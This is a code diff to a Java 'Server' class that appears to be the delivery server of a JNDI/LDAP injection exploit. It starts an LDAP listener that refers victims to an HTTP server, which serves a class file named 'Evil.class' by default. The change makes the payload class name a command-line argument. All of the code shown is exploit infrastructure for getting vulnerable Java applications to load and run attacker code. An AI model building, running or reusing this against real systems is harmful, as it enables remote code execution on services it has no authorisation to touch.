@@ -24,13 +24,14 @@ import java.nio.ByteBuffer;
 
 public  class  Server  {
     private  static  final String LDAP_BASE = "dc=example,dc=com" ;
-
+    private static String payloadClassname;
     public  static  void  main (String[] args) throws IOException, LDAPException {
-        String[] defaultArgs = {"http://127.0.0.1:8000/#Evil", "9999", "8000"};
+        String[] defaultArgs = {"http://127.0.0.1:8000/#Evil", "9999", "8000", "Evil.class"};
 
-        if (args.length != 3) {
+        if (args.length != 4) {
             args = defaultArgs;
         }
+        payloadClassname = args[3];
 
         setupLDAP(args[0], Integer.parseInt(args[1]));
         setupHTTP(Integer.parseInt(args[2]));
@@ -72,7 +73,7 @@ public  class  Server  {
     }
 
     private static byte[] readEvil() throws IOException {
-        InputStream is = Server.class.getClassLoader().getResourceAsStream("Evil.class");
+        InputStream is = Server.class.getClassLoader().getResourceAsStream(payloadClassname);
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
 
         int nRead;
